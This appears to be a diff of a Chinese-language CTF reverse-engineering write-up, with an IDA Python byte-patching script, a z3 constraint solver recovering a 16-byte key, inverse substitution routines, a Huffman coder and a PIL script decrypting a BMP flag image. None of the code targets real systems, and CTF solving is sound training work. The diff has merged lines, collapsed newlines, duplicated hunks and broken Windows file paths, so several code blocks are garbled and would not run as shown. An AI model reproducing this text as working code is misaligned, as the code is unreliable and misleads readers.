 0x23import idcdata = [0x55,0x8b,0xec,0x83,0xec,0x8,0xc7,0x45,0xfc,0x0,0x0,0x0,0x0,0xb8,0x1,0x0,0x0,0x0,0x6b,0xc8,0x0,0x8b,0x55,0x8,0xc6,0x4,0xa,0x2,0x8b,0x45,0xfc,0x83,0xc0,0x1,0x89,0x45,0xfc,0xb9,0x1,0x0,0x0,0x0,0xc1,0xe1,0x0,0x8b,0x55,0x8,0xc6,0x4,0xa,0x3,0x8b,0x45,0xfc,0x83,0xc0,0x1,0x89,0x45,0xfc,0xc7,0x45,0xf8,0x4,0x0,0x0,0x0,0xeb,0x9,0x8b,0x4d,0xf8,0x83,0xc1,0x1,0x89,0x4d,0xf8,0x83,0x7d,0xf8,0x1e,0x77,0x31,0x83,0x7d,0xfc,0xa,0x72,0x2,0xeb,0x29,0x8b,0x55,0xf8,0x52,0xe8,0x5a,0xff,0xff,0xff,0x83,0xc4,0x4,0xf,0xb6,0xc0,0x85,0xc0,0x74,0x14,0x8b,0x4d,0x8,0x3,0x4d,0xfc,0x8a,0x55,0xf8,0x88,0x11,0x8b,0x45,0xfc,0x83,0xc0,0x1,0x89,0x45,0xfc,0xeb,0xc0,0x8b,0xe5,0x5d,0xc3,0xcc,0xcc,0xcc,0xcc,0xcc,0xcc,0x76,0xa8,0xcf,0xa0,0xcf,0x37,0x82,0xdf,0x1d,0x61,0x23,0x10,0xe6,0xaa,0x66,0xdf,0x49,0x29,0x49,0x23,0xae,0x66,0xd3,0x73,0xcb,0x50,0x18,0x23,0x23,0xa0,0xe7,0x2f,0xae,0x6e,0xd3,0x72,0xcb,0x64,0xdc,0xdc,0xdc,0xa0,0xe7,0x27,0xe4,0x66,0xcf,0x23,0x23,0x23,0x23,0xc8,0x2a,0xa8,0x76,0xcf,0xa0,0xe1,0x22,0xaa,0x76,0xcf,0xa0,0x5e,0xcf,0x29,0x50,0x3d,0xa8,0x66,0x2f,0x73,0xa8,0x6e,0x2b,0x72,0xa8,0x76,0xcf,0x2c,0x95,0x67,0x36,0xd3,0xa8,0x2f,0xa6,0xa3,0x1d,0x61,0x23,0xdc,0xf2,0xa0,0xe7,0x2b,0xc8,0xf0,0xa8,0x6e,0xdf,0x10,0xee,0xcb,0xcd,0xc,0x23,0x23,0xa8,0xc6,0x7e,0xe0]def Patch(begin,end,Xor): for i in range(begin,end): idc.patch_byte(i,Xor[i-begin])
-```
-
-
-
-```
 from z3 import *input = [BitVec(f"input[{i}]",8) for i in range(16)]dword_422000 = [0x0002A81A, 0x00028D44, 0x00022653, 0x0002E993, 0x000249B5, 0x00024265, 0x0003253D, 0x0002D77B, 0x000282C8, 0x00022892, 0x0002BD54, 0x0002482E, 0x00024C1F, 0x00028127, 0x0001E62E, 0x0001F009]Sol = Solver()Sol.add(dword_422000[12] == (199 * input[9] + 98 * input[7] + 192 * input[8] + 23 * input[12] + 79 * input[14] + 77 * input[10] + 185 * input[13] + 135 * input[15] + 119 * input[4] + 54 * input[0] + 41 * input[1] + 124 * input[6] + 18 * input[2] + 181 * input[11] + 191 * input[5] + 7 * input[3]) & 0xffffffff )
 Sol.add(dword_422000[3] == (210 * input[11] + 26 * input[15] + 169 * input[0] + 177 * input[13] + input[6] + 205 * input[8] + 223 * input[10] + 32 * input[5] + 225 * input[3] + 61 * input[14] + 72 * input[1] + 186 * input[9] + 253 * input[12] + 205 * input[2] + 49 * input[4] + 232 * input[7] ) & 0xffffffff )
 Sol.add(dword_422000[13] == (192 * input[3] + 22 * input[10] + 175 * input[1] + 184 * input[7] + 116 * input[15] + 70 * input[13] + 153 * input[14] + 119 * input[0] + 217 * input[6] + 123 * input[5] + 17 * input[2] + 244 * input[12] + 116 * input[8] + 46 * input[4] + 19 * input[9] + 130 * input[11])& 0xffffffff )
-Sol.add (dword_422000[7] == (41 * input[12] + 71 * input[7] + 185 * input[1] + 69 * input[11] + 142 * input[8] + 221 * input[5] + 24 * input[3] + 208 * input[6] + 41 * input[9] + 159 * input[2] + 231 * input[14] + 235 * input[13] + 225 * input[0] + (input[4] << 6) + 162 * input[10] + 134 * input[15] )& 0xffffffff )Sol.add (dword_422000[11] == (36 * input[12] + 220 * input[4] + 110 * input[13] + 45 * input[7] + 123 * input[9] + 133 * input[1] + 101 * input[5] + 137 * input[10] + 102 * input[0] + 227 * input[14] + 94 * input[15] + 18 * input[2] + 22 * input[6] + 189 * input[11] + 218 * input[8])& 0xffffffff )Sol.add (dword_422000[15] == (86 * input[11] + 31 * input[9] + 229 * input[6] + 27 * input[3] + 6 * input[12] + 13 * input[10] + 158 * input[1] + 89 * input[7] + 35 * input[15] + 126 * input[8] + 165 * input[13] + 220 * input[0] + 138 * input[5] + 100 * input[4] + 84 * input[14] + 175 * input[2]) & 0xffffffff )Sol.add(dword_422000[8] == ( 7 * input[1] + 28 * input[8] + 131 * input[10] + 6 * input[6] + 254 * input[0] + 130 * input[13] + 124 * input[3] + 55 * input[12] + 157 * input[14] + 175 * input[5] + 140 * input[4] + 241 * input[9] + 11 * input[11] + 211 * input[2] + 121 * input[7] + 200 * input[15] ) & 0xffffffff )Sol.add(dword_422000[6] == (195 * input[14] + 197 * input[13] + 218 * input[7] + 83 * input[1] + 98 * input[2] + 70 * input[10] + 229 * input[15] + 148 * input[11] + 195 * input[0] + 94 * input[6] + 211 * input[12] + 220 * input[9] + 81 * input[5] + 253 * input[8] + 78 * input[4] + 4 * input[3] ) & 0xffffffff ) Sol.add(dword_422000[14] == (3 * input[4] + 136 * input[7] + 156 * input[3] + 189 * input[1] + 244 * input[12] + 157 * input[15] + 83 * input[9] + 6 * input[0] + 113 * input[6] + 63 * input[14] + 35 * input[2] + 22 * input[8] + 26 * input[10] + 62 * input[11] + 98 * input[5] + 110 * input[13] )& 0xffffffff )Sol.add(dword_422000[4] == (96 * input[4] + 248 * input[8] + 191 * input[9] + 194 * input[2] + 154 * input[1] + 31 * input[6] + 157 * input[7] + 248 * input[13] + 81 * input[15] + 56 * input[10] + 52 * input[0] + 94 * input[12] + 212 * input[5] + 83 * input[3] + 83 * input[14] + 158 * input[11] )& 0xffffffff )Sol.add(dword_422000[1] == (67 * input[4] + 220 * input[2] + 123 * input[11] + 168 * input[5] + 23 * input[12] + 148 * input[7] + 127 * input[10] + 194 * input[1] + 132 * input[8] + 44 * input[0] + 60 * input[13] + 98 * input[15] + 38 * input[14] + 245 * input[9] + 159 * input[6] + 146 * input[3] )& 0xffffffff )Sol.add(dword_422000[5] == (132 * input[3] + 10 * input[7] + 95 * input[0] + 83 * input[10] + 99 * input[1] + 77 * input[12] + 195 * input[2] + 47 * input[6] + 38 * input[13] + 178 * input[8] + 74 * input[4] + 86 * input[11] + 208 * input[9] + 240 * input[14] + 120 * input[5] + 43 * input[15] )& 0xffffffff )Sol.add(dword_422000[9] == (172 * input[1] + 110 * input[2] + 92 * input[7] + 126 * input[15] + 91 * input[0] + 77 * input[6] + 207 * input[5] + 249 * input[11] + 240 * input[12] + 129 * input[10] + 6 * input[13] + 100 * input[3] + input[14] + 76 * input[9] + 127 * input[4] + 4 * input[8] )& 0xffffffff )Sol.add(dword_422000[10] == (46 * input[15] + 37 * input[0] + 3 * input[3] + 72 * input[6] + 116 * input[7] + 186 * input[1] + 221 * input[14] + 236 * input[4] + 79 * input[2] + 175 * input[10] + 184 * input[9] + 160 * input[11] + 227 * input[12] + 99 * input[8] + 71 * input[13] + 4 * input[5] )& 0xffffffff )Sol.add(dword_422000[0] == (203 * input[3] + 31 * input[0] + 11 * input[14] + 149 * input[7] + 215 * input[5] + 206 * input[1] + 245 * input[6] + 9 * input[11] + 16 * input[10] + 241 * input[13] + 110 * input[8] + 175 * input[2] + 38 * input[4] + 227 * input[9] + 208 * input[12] + 8 * input[15] )& 0xffffffff )Sol.add(dword_422000[2] == (132 * input[3] + 119 * input[14] + 26 * input[8] + 24 * input[6] + 121 * input[11] + 235 * input[2] + 228 * input[12] + 34 * input[5] + 37 * input[15] + 24 * input[9] + 145 * input[13] + 199 * input[4] + 173 * input[10] + 58 * input[0] + 246 * input[7] + 199 * input[1]) & 0xffffffff ) 
+Sol.add (dword_422000[7] == (41 * input[12] + 71 * input[7] + 185 * input[1] + 69 * input[11] + 142 * input[8] + 221 * input[5] + 24 * input[3] + 208 * input[6] + 41 * input[9] + 159 * input[2] + 231 * input[14] + 235 * input[13] + 225 * input[0] + (input[4] << 6) + 162 * input[10] + 134 * input[15] )& 0xffffffff )Sol.add (dword_422000[11] == (36 * input[12] + 220 * input[4] + 110 * input[13] + 45 * input[7] + 123 * input[9] + 133 * input[1] + 101 * input[5] + 137 * input[10] + 102 * input[0] + 227 * input[14] + 94 * input[15] + 18 * input[2] + 22 * input[6] + 189 * input[11] + 218 * input[8])& 0xffffffff )Sol.add (dword_422000[15] == (86 * input[11] + 31 * input[9] + 229 * input[6] + 27 * input[3] + 6 * input[12] + 13 * input[10] + 158 * input[1] + 89 * input[7] + 35 * input[15] + 126 * input[8] + 165 * input[13] + 220 * input[0] + 138 * input[5] + 100 * input[4] + 84 * input[14] + 175 * input[2]) & 0xffffffff )Sol.add(dword_422000[8] == ( 7 * input[1] + 28 * input[8] + 131 * input[10] + 6 * input[6] + 254 * input[0] + 130 * input[13] + 124 * input[3] + 55 * input[12] + 157 * input[14] + 175 * input[5] + 140 * input[4] + 241 * input[9] + 11 * input[11] + 211 * input[2] + 121 * input[7] + 200 * input[15] ) & 0xffffffff )Sol.add(dword_422000[6] == (195 * input[14] + 197 * input[13] + 218 * input[7] + 83 * input[1] + 98 * input[2] + 70 * input[10] + 229 * input[15] + 148 * input[11] + 195 * input[0] + 94 * input[6] + 211 * input[12] + 220 * input[9] + 81 * input[5] + 253 * input[8] + 78 * input[4] + 4 * input[3] ) & 0xffffffff ) Sol.add(dword_422000[14] == (3 * input[4] + 136 * input[7] + 156 * input[3] + 189 * input[1] + 244 * input[12] + 157 * input[15] + 83 * input[9] + 6 * input[0] + 113 * input[6] + 63 * input[14] + 35 * input[2] + 22 * input[8] + 26 * input[10] + 62 * input[11] + 98 * input[5] + 110 * input[13] )& 0xffffffff )Sol.add(dword_422000[4] == (96 * input[4] + 248 * input[8] + 191 * input[9] + 194 * input[2] + 154 * input[1] + 31 * input[6] + 157 * input[7] + 248 * input[13] + 81 * input[15] + 56 * input[10] + 52 * input[0] + 94 * input[12] + 212 * input[5] + 83 * input[3] + 83 * input[14] + 158 * input[11] )& 0xffffffff )Sol.add(dword_422000[1] == (67 * input[4] + 220 * input[2] + 123 * input[11] + 168 * input[5] + 23 * input[12] + 148 * input[7] + 127 * input[10] + 194 * input[1] + 132 * input[8] + 44 * input[0] + 60 * input[13] + 98 * input[15] + 38 * input[14] + 245 * input[9] + 159 * input[6] + 146 * input[3] )& 0xffffffff )Sol.add(dword_422000[5] == (132 * input[3] + 10 * input[7] + 95 * input[0] + 83 * input[10] + 99 * input[1] + 77 * input[12] + 195 * input[2] + 47 * input[6] + 38 * input[13] + 178 * input[8] + 74 * input[4] + 86 * input[11] + 208 * input[9] + 240 * input[14] + 120 * input[5] + 43 * input[15] )& 0xffffffff )Sol.add(dword_422000[9] == (172 * input[1] + 110 * input[2] + 92 * input[7] + 126 * input[15] + 91 * input[0] + 77 * input[6] + 207 * input[5] + 249 * input[11] + 240 * input[12] + 129 * input[10] + 6 * input[13] + 100 * input[3] + input[14] + 76 * input[9] + 127 * input[4] + 4 * input[8] )& 0xffffffff )Sol.add(dword_422000[10] == (46 * input[15] + 37 * input[0] + 3 * input[3] + 72 * input[6] + 116 * input[7] + 186 * input[1] + 221 * input[14] + 236 * input[4] + 79 * input[2] + 175 * input[10] + 184 * input[9] + 160 * input[11] + 227 * input[12] + 99 * input[8] + 71 * input[13] + 4 * input[5] )& 0xffffffff )Sol.add(dword_422000[0] == (203 * input[3] + 31 * input[0] + 11 * input[14] + 149 * input[7] + 215 * input[5] + 206 * input[1] + 245 * input[6] + 9 * input[11] + 16 * input[10] + 241 * input[13] + 110 * input[8] + 175 * input[2] + 38 * input[4] + 227 * input[9] + 208 * input[12] + 8 * input[15] )& 0xffffffff )Sol.add(dword_422000[2] == (132 * input[3] + 119 * input[14] + 26 * input[8] + 24 * input[6] + 121 * input[11] + 235 * input[2] + 228 * input[12] + 34 * input[5] + 37 * input[15] + 24 * input[9] + 145 * input[13] + 199 * input[4] + 173 * input[10] + 58 * input[0] + 246 * input[7] + 199 * input[1]) & 0xffffffff )
 assert Sol.check() == satprint(Sol.model())
 input = [None] * 16input[11] = 51input[0] = 90input[2] = 1input[14] = 114input[6] = 186input[13] = 43input[5] = 42input[4] = 43input[12] = 113input[15] = 72input[1] = 45input[10] = 186input[9] = 179input[7] = 51input[8] = 72input[3] = 51
 idx = [0x02, 0x03, 0x05, 0x07, 0x0B, 0x0D, 0x11, 0x13, 0x17, 0x1D]byte_423D80 = [0xD1, 0x9C, 0x68, 0xC0, 0x13, 0xAC, 0x48, 0x32, 0xA3, 0xBA, 0x4C, 0xE7, 0x6D, 0xC8, 0x1C, 0xAB, 0xE2, 0x7A, 0x42, 0xE1, 0x7B, 0x16, 0x67, 0x03, 0xAE, 0x7E, 0xAA, 0x38, 0x22, 0x02, 0x39, 0x51, 0xC7, 0x79, 0xD7, 0xCB, 0xEF, 0x62, 0x98, 0xDC, 0x53, 0x72, 0x89, 0xA5, 0x4B, 0xC6, 0x86, 0xF6, 0xFC, 0x77, 0x5A, 0xF5, 0x2E, 0x3D, 0xB2, 0xFE, 0x59, 0x27, 0x80, 0x63, 0xDD, 0x1A, 0x12, 0x5E, 0xED, 0xB0, 0xBC, 0xC4, 0x5F, 0x11, 0xC9, 0x09, 0xC5, 0x75, 0x96, 0x0A, 0x2F, 0x00, 0x17, 0x81, 0x14, 0x47, 0xBB, 0x9D, 0x8E, 0x3C, 0xD6, 0xA1, 0xE0, 0xA2, 0x26, 0x5D, 0x08, 0x6E, 0x4E, 0xF1, 0xCF, 0x73, 0x8A, 0x90, 0x0B, 0xB3, 0x3E, 0xB6, 0x1F, 0xC3, 0xB7, 0xDA, 0x8D, 0x05, 0xEE, 0x18, 0x93, 0x3A, 0x6A, 0x8C, 0x43, 0x8F, 0xEB, 0xE9, 0x5B, 0x29, 0x37, 0x1E, 0x46, 0x33, 0x31, 0xFB, 0x35, 0x34, 0x61, 0x04, 0x0E, 0x2B, 0x74, 0xF9, 0x8B, 0x2C, 0x20, 0x0C, 0x7C, 0x28, 0x5C, 0xCA, 0xE6, 0x6B, 0xD8, 0x30, 0xE4, 0x21, 0x44, 0x70, 0x06, 0xA6, 0x60, 0x41, 0x84, 0x10, 0x95, 0x4F, 0x64, 0x83, 0xD2, 0x9A, 0xBE, 0xAF, 0x9F, 0x07, 0xC1, 0xB8, 0x3B, 0x65, 0xCC, 0x57, 0xB5, 0xD9, 0x92, 0xDE, 0x0D, 0xE3, 0xF3, 0xA4, 0xBD, 0x6F, 0xD3, 0x25, 0x88, 0x71, 0xFF, 0xA9, 0x36, 0xB1, 0x78, 0x24, 0x69, 0xAD, 0x19, 0xBF, 0xFD, 0xCD, 0x4A, 0xEA, 0x87, 0x91, 0xA8, 0x66, 0x82, 0x50, 0x0F, 0x99, 0x45, 0xF2, 0xD5, 0x9B, 0x94, 0x7D, 0xCE, 0xDB, 0xB9, 0x52, 0xE5, 0xF4, 0x01, 0x7F, 0xD4, 0x15, 0x2D, 0x3F, 0x1D, 0xA7, 0xC2, 0xFA, 0x40, 0xE8, 0xA0, 0x55, 0x6C, 0xF7, 0x1B, 0x58, 0x85, 0x56, 0x9E, 0xEC, 0x97, 0x23, 0xF0, 0x4D, 0xD0, 0xF8, 0x2A, 0x49, 0xB4, 0x76, 0x54, 0xDF]def Fun_0x1d(): for i in range(len(input)): for j in range(len(byte_423D80)): if byte_423D80[j] == input[i]: input[i] = j break
@@ -293,20 +271,13 @@ byte_422380 = [0x45, 0x1F, 0x63, 0x81, 0xE6, 0xAD, 0x4F, 0xD3, 0xC0, 0x15, 0x69,
 
 Fun_0x1d()Fun_0x17()Fun_0x13()Fun_0x11()Fun_0xd()Fun_0xb()Fun_0x7()Fun_0x5()Fun_0x3()Fun_0x2()
 for i in range(len(input)): print(chr(input[i]),end = "")
-```
-
-
-
-```
 [Char:'h' Frequency: 7] [Char:'a' Frequency: 6] [Char:'y' Frequency: 5] [Char:'c' Frequency: 4] [Char:'u' Frequency: 3] [Char:'m' Frequency: 2] [Char:'d' Frequency: 1]
-```
-
-
-
-```
-#include <iostream>#include <vector>#include <string>
+    #include #include <vector>#include <string>
 using namespace std;
-const int INF = 1000000000;const int maxBit = 1 << 5;const int maxNode = 1 << 10;const int maxCode = 1 << 10;
+const int INF = 1000000000;
+const int maxBit = 1 << 5;
+const int maxNode = 1 << 10;
+const int maxCode = 1 << 10;
 // 节点信息结构struct Node { // 值 string value; // 权值 float weight; // 父节点 int parent; // 左子节点 int lchild; // 右子节点 int rchild;};
 // 编码信息结构struct Code { // 编码字符 int bit[maxBit]; // 开始位置 int start; // 值 string value;};
 // 节点数组Node huffman[maxNode];// 编码数组Code huffmanCode[maxCode];
@@ -327,19 +298,14 @@ int main() { while(true) { // 初始化
  // huffman编码 huffmanEncoding();
  // 打印每个叶节点的Huffman编码和编码起始值 printHuffmanCode();
  while(true) { cout << "请输入一段符合上述编码的0,1序列(q进入下一次编码解码)："; string s; cin >> s; if(s[0] == 'q') { cout << endl; break; } cout << "原始0,1序列为：" << s << endl; cout << "解码后为："; // 解码 HuffmanDecoding(s); } } return 0;
-```
-
-
-
-```
-lg = cip.load()for i in range(360):for j in range(360):flg[i,j] = f2_pix[i * 360 + j]      # 其实这种处理方法不很规整，bmp的像素不止3字节，还有一个保留位 =># typedef struct tagRGBQUAD# {#     BYTE rgbBlue; /*指定蓝色分量*/#     BYTE rgbGreen; /*指定绿色分量*/#     BYTE rgbRed; /*指定红色分量*/#     BYTE rgbReserved; /*保留，指定为0*/# } RGBQUAD;cip.save(r"C:UsersAdministratorDesktopDasctf11月赛re1babyimgflagggg.bmp")cip.show()
-```
-
-
-
-```
+lg = cip.load()for i in range(360):
+for j in range(360):
+flg[i,j] = f2_pix[i * 360 + j]      # 其实这种处理方法不很规整，bmp的像素不止3字节，还有一个保留位 =># typedef struct tagRGBQUAD
+# {#     BYTE rgbBlue; /*指定蓝色分量*/#     BYTE rgbGreen; /*指定绿色分量*/#     BYTE rgbRed; /*指定红色分量*/#     BYTE rgbReserved; /*保留，指定为0*/# } RGBQUAD;cip.save(r"C:
+UsersAdministratorDesktopDasctf11月赛re1babyimgflagggg.bmp")cip.show()
 from PIL import Image
-cip = Image.open(r"C:UsersAdministratorDesktopDasctf11月赛re1babyimgflag.enc.bmp")
+cip = Image.open(r"C:
+UsersAdministratorDesktopDasctf11月赛re1babyimgflag.enc.bmp")
 width = 360height = 360
 cip_pix = [[0 for i in range(360)] for j in range(360)]f1_pix = [[0 for i in range(360)] for j in range(360)]f2_pix = []fin_pix = []for i in range(height): for j in range(width): cip_pix[i][j] = (cip.getpixel((i,j)))
 
@@ -353,7 +319,8 @@ for i in range(len(f2_pix)): t0 = (f2_pix[i])[0] t1 = (f2_pix[i])[1] t2 = (f2_pi
 
 flg = cip.load()for i in range(360): for j in range(360): flg[i,j] = f2_pix[i * 360 + j] # 其实这种处理方法不很规整，bmp的像素不止3字节，还有一个保留位 => # typedef struct tagRGBQUAD # { # BYTE rgbBlue; /*指定蓝色分量*/ # BYTE rgbGreen; /*指定绿色分量*/ # BYTE rgbRed; /*指定红色分量*/ # BYTE rgbReserved; /*保留，指定为0*/ # } RGBQUAD; # 按理说我们应该添加上，但不添加也能正常显示
 
-cip.save(r"C:UsersAdministratorDesktopDasctf11月赛re1babyimgflagggg.bmp")cip.show()
+cip.save(r"C:
+UsersAdministratorDesktopDasctf11月赛re1babyimgflagggg.bmp")cip.show()
 ```
 
 
